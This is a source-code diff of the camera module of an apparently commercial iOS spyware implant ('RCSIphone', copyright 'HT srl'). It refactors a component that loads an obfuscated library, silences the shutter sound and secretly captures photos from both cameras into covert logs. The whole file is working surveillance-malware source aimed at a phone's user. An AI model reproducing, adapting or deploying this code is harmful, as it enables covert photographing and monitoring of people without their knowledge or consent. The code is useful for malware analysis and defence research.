@@ -3,7 +3,7 @@
 //  RCSIphone
 //
 //  Created by kiodo on 02/12/11.
-//  Copyright 2011 __MyCompanyName__. All rights reserved.
+//  Copyright 2011 HT srl. All rights reserved.
 //
 #import <dlfcn.h>
 #import <AudioToolbox/AudioToolbox.h>
@@ -19,90 +19,33 @@
 typedef NSData* (*camera_t) (NSInteger);
 typedef void (*disableSound_t)(void);
 
-static RCSIAgentCamera *sharedAgentCamera = nil;
+#define KAVCaptureDevicePositionBack   1
+#define KAVCaptureDevicePositionFront  2
+
 static camera_t runCamera;
 static disableSound_t disableShutterSound;
 
 @implementation RCSIAgentCamera
 
-@synthesize mAgentConfiguration;
-
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSIAgentCamera *)sharedInstance
+- (id)initWithConfigData:(NSData*)aData
 {
-  @synchronized(self)
-  {
-  if (sharedAgentCamera == nil)
+  self = [super initWithConfigData: aData];
+
+  if (self != nil)
     {
-      [[self alloc] init];
+      mAgentID = AGENT_CAM; 
     }
-  }
-  
-  return sharedAgentCamera;
-}
 
-+ (id)allocWithZone: (NSZone *)aZone
-{
-  @synchronized(self)
-  {
-  if (sharedAgentCamera == nil)
-    {
-      sharedAgentCamera = [super allocWithZone: aZone];
-      return sharedAgentCamera;
-    }
-  }
-  
-  // On subsequent allocation attemps return nil
-  return nil;
-}
-
-- (id)copyWithZone: (NSZone *)aZone
-{
   return self;
 }
 
-- (id)retain
-{
-  return self;
-}
-
-- (unsigned)retainCount
-{
-  return UINT_MAX;
-}
-
-- (void)release
-{
- 
-}
-
-- (id)autorelease
-{
-  return self;
-}
-
-- (id)init
-{
-  Class myClass = [self class];
-  
-  @synchronized(myClass)
-  {
-    if (sharedAgentCamera != nil)
-      {
-        self = [super init];
-      
-        if (self != nil)
-          {
-            sharedAgentCamera = self;            
-          }
-      } 
-  }
-  
-  return sharedAgentCamera;
-}
+#pragma mark -
+#pragma mark support methods
+#pragma mark -
 
 #define CAM_DYLIB_NAME @"3@e337a.dib"
 #define CAM_DYLIB_FUNC "runCamera"
@@ -113,7 +56,7 @@ static disableSound_t disableShutterSound;
   
   BOOL bRet = FALSE;
 
-  if (gOSMajor >= 4)
+  if (gOSMajor >= 4 || (gOSMajor == 4 && gOSMinor == 1))
     {
       NSString *path = [[NSBundle mainBundle] bundlePath];
       NSString *camDylibPathName = [[NSString alloc] initWithFormat: @"%@/%@", path, CAM_DYLIB_NAME];
@@ -148,13 +91,13 @@ static disableSound_t disableShutterSound;
 
 - (void)_grabCameraShot
 {
-  if (gCameraActive == TRUE)
-    return;
-    
-  //Front Log
   NSData *image = nil;
   
-  image = runCamera(1);
+  if (gCameraActive == TRUE || [self isThreadCancelled] == TRUE)
+    return;
+  
+  //Back Log  
+  image = runCamera(KAVCaptureDevicePositionBack);
   
   if (image != nil && [image isKindOfClass: [NSData class]])
     {
@@ -169,8 +112,7 @@ static disableSound_t disableShutterSound;
           [logManager writeDataToLog: (NSMutableData*)image 
                             forAgent: LOG_CAMERA
                            withLogID: 0];
-        }
-        
+        } 
     
       [logManager closeActiveLog: LOG_CAMERA
                      withLogID: 0];
@@ -178,11 +120,11 @@ static disableSound_t disableShutterSound;
       [image release];
     }
   
-  if (gCameraActive == TRUE)
+  if (gCameraActive == TRUE || [self isThreadCancelled] == TRUE)
     return;
       
-  // Rear log
-  image = runCamera(2);
+  // Front log
+  image = runCamera(KAVCaptureDevicePositionFront);
   
   if (image == nil)
     return;
@@ -206,48 +148,31 @@ static disableSound_t disableShutterSound;
   [image release];
 }
 
-- (void)start
+- (void)startAgent
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  cameraStruct *conf;
-  NSData *messageRawData;
-  
-  if ([self _checkCameraCompatibilty] == NO)
+  if ([self _checkCameraCompatibilty] == NO ||
+      [self mAgentStatus] != AGENT_STATUS_STOPPED || 
+      [self isThreadCancelled] == TRUE)
     {
+      [self setMAgentStatus: AGENT_STATUS_STOPPED];
       [outerPool release];
       return;
     }
  
   disableShutterSound();
   
-  messageRawData = [mAgentConfiguration objectForKey: @"data"];
-  conf = (cameraStruct *)[messageRawData bytes];
-
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];  
-
   [self _grabCameraShot];
   
-  [mAgentConfiguration setObject: AGENT_STOP forKey:@"status"];
-  
-  [mAgentConfiguration release];
-  mAgentConfiguration = nil;
-  
+  [self setMAgentStatus: AGENT_STATUS_STOPPED];
+
   [outerPool release];
 }
 
-- (BOOL)stop
+- (BOOL)stopAgent
 {
-  int internalCounter = 0;
-  
-  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
-  
-  while (internalCounter <= MAX_WAIT_TIME)
-    {
-      internalCounter++;
-      sleep(1);
-    }
-  
+  [self setMAgentStatus: AGENT_STATUS_STOPPING];
   return YES;
 }
 
